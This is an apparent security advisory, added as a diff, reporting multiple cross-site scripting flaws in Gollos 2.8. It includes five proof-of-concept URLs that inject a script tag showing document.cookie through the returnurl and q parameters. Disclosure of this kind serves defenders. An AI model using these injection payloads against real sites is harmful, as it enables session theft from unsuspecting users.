@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/46379/info
+
+Gollos is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Gollos 2.8 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/?returnurl="><script>alert(document.cookie)</script>
+
+http://www.example.com/register.aspx?returnurl="><script>alert(document.cookie)</script>
+
+http://www.example.com/publication/info.aspx?pt=1&returnurl="><script>alert(document.cookie)</script>
+
+http://www.example.com/user/add.aspx?returnurl="><script>alert(document.cookie)</script>user/add.aspx
+
+http://www.example.com/product/list.aspx?q=1"><script>alert(document.cookie)</script>&x=0&y=0
